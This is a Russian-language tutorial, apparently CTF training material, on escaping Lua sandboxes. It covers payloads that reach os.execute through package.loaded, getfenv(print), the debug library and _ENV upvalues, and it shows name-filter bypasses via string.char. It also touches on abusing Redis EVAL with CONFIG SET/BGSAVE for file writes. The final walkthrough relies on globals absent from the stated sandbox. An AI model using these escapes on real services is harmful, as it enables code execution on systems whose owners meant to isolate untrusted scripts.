## Вопрос, с которого всё начинается

После Node.js — тот же сюжет на Lua. Сервис принимает Lua-код, создаёт «чистое» окружение с `print`, `string`, `table` и исполняет его. `os` и `io` недоступны. Разработчик уверен: язык маленький, библиотек мало, что тут может пойти не так. Как выйти из этой песочницы?

## Наш пример: Lua-джейл с setfenv

Условие даёт код:

```lua
local env = { print = print, string = string, table = table }
setfenv(loadstring(code), env)()
```

`loadstring` компилирует наш код, `setfenv` подменяет ему окружение (`env`) — таблицу глобальных имён. В `env` только три функции, `os`/`io` там нет. Первый шаг — посмотреть, что реально осталось доступным:

```lua
print(_G)
```

`_G` — глобальная таблица. Часто она не очищена так тщательно, как `env`.

## Шаг 1: проверяем package.loaded

`package.loaded` — таблица уже загруженных модулей. Разработчики часто забывают её почистить, а `os`/`io` там уже лежат:

```lua
print(package.loaded['os'])
```

Если модуль есть — побег в одну строку:

```lua
package.loaded['os'].execute('cat /flag')
```

Это первая «дыра», которую стоит проверить: загруженные нативные модули почти всегда доступны.

## Шаг 2: библиотека debug

Библиотека `debug` даёт доступ к внутреннему состоянию интерпретатора:

```lua
debug.getregistry()      -- реестр всех объектов Lua
debug.getinfo(1)         -- информация о текущем кадре
debug.getupvalue(f, i)   -- захваченные переменные функции
debug.getmetatable(o)    -- метатаблица объекта
```

Если `debug` доступен, побег почти гарантирован: через `debug.getregistry()` достают функции, которые песочница считала спрятанными, а через `debug.getinfo` — окружение вызывающего кода, где `os`/`io` ещё живы. Разработчики часто забывают убрать `debug`, потому что «он же только для отладки».

## Шаг 3: getfenv — окружение нативной функции

В Lua 5.1 у каждой функции есть окружение. `getfenv(func)` возвращает таблицу глобальных имён, доступных этой функции:

```lua
getfenv(print).os.execute('cat /flag')
```

Логика: `print` — «настоящая» функция из основного окружения, а значит её окружение — это исходный `_G`, где `os` на месте. Получив окружение любой нативной функции, мы получаем доступ к тому, что песочница пыталась спрятать.

## Шаг 4: метатаблицы и обход фильтров

Lua-объекты могут иметь **метатаблицы**, определяющие поведение операций (`__index`, `__call`). Иногда в песочнице остаются объекты с метатаблицами, ведущими к нативным функциям:

```lua
local mt = debug.getmetatable(someobj)
for k, v in pairs(mt) do print(k, v) end
```

Если фильтр запрещает подстроки, собираем имена динамически:

```lua
local name = string.char(111, 115)   -- "os"
_G[name].execute('cat /flag')
```

`string.char(111, 115)` даёт `os`, не содержа подстроки `os` в исходнике. Так же работает конкатенация `'o'..'s'`.

## Шаг 5: разница версий

Lua 5.1: есть `getfenv`/`setfenv`, нет `_ENV`. Lua 5.2+: `getfenv` удалён, окружение — это upvalue `_ENV`, доступный через `debug.getupvalue`:

```lua
debug.getupvalue(func, 1)   -- для 5.2+ достаём _ENV
```

Всегда определяйте версию через `_VERSION` — payload зависит от неё.

## Шаг 6: если не сработало

- **`debug` убран.** Проверьте `package.loaded`, `_G`, метатаблицы.
- **Запрещены строки.** Используйте `string.char` и конкатенацию.
- **Нет `loadstring`.** Используйте окружения уже загруженных функций.
- **Всё вычищено.** Ищите `require`, `dofile`, `loadfile`, которые забыли убрать.
- **Фильтр по именам.** `_G['o'..'s']` обходит его.

## Практический пример: Redis EVAL и встроенные движки

Lua живёт не только в отдельном интерпретаторе — его встраивают в Redis, nginx и редакторы. В Redis команда `EVAL` исполняет Lua-скрипт на сервере, и хотя полноценного «побега в shell» там обычно нет, песочница богата на злоупотребления. Часто задача — не выйти из языка, а использовать доступные функции: например, `redis.call` для записи в файлы через `CONFIG SET dir` и `BGSAVE`, что даёт запись произвольного файла (а иногда и RCE через cron или модули).

Если в окружении остаётся `redis.call` или `redis.log`, изучите, что они позволяют. Общий принцип тот же, что и в джейлах: ищите функцию с побочным эффектом, которую разработчик не счёл опасной. А в nginx-lua или редакторных движках проверяйте, не остался ли доступ к файловой системе через нативные модули.

## Полный прогон: от `print(_G)` до флага

Соберём методику в одну последовательность. Дано: песочница с `env = {print, string, table}` и `setfenv(loadstring(code), env)()`.

```lua
-- 1. разведка: что осталось доступным
print(_G)                              -- вдруг _G не очищен
print(package.loaded['os'])            -- нативный модуль мог остаться

-- 2. если os есть — побег в одну строку
package.loaded['os'].execute('cat /flag')

-- 3. иначе — через debug
print(debug.getregistry())             -- ищем спрятанные функции
local env = debug.getfenv(print)       -- окружение нативной функции (5.1)
env.os.execute('cat /flag')

-- 4. если фильтр режет имена — собираем динамически
local n = string.char(111, 115)        -- "os"
_G[n].execute('cat /flag')
```

Ключевая идея: песочница ограничивает **новое** окружение, но нативные функции (`print`, `string`) по-прежнему живут в исходном `_G` — и через `getfenv`/`debug` до него можно дотянуться. Поэтому важно проверять не только то, что явно дали, но и то, что «просочилось».

## Что мы теперь знаем

По-простому:

1. Начинайте с `_G` и `package.loaded` — смотрите, что осталось доступным.
2. `debug` ломает изоляцию: реестр, окружения, upvalue.
3. `getfenv(print)` возвращает исходное окружение с `os`/`io` (Lua 5.1).
4. Строковые фильтры обходятся `string.char` и конкатенацией.
5. В 5.2+ `getfenv` нет — используйте `debug.getupvalue` и `_ENV`.

## На что смотреть дальше

- **Считать `debug` убранным.** Его часто забывают — он «только для отладки».
- **Не проверять `package.loaded`.** Там могут жить `os`/`io`.
- **Путать версии.** `getfenv`/`setfenv` есть только в 5.1.
- **Игнорировать метатаблицы.** Через них вызываются скрытые функции.
- **Забыть про `_G`.** Глобальная таблица часто доступна.

## Куда дальше

Мы выбрались из Lua-песочницы через забытые библиотеки. Дальше вернёмся к Python, но на более высоком уровне: разберём **аудит-хуки и `ctypes`** — что делать, когда фильтр стал системным. А пока главное запомни: Lua-песочница ломается через окружения нативных функций и забытые модули.
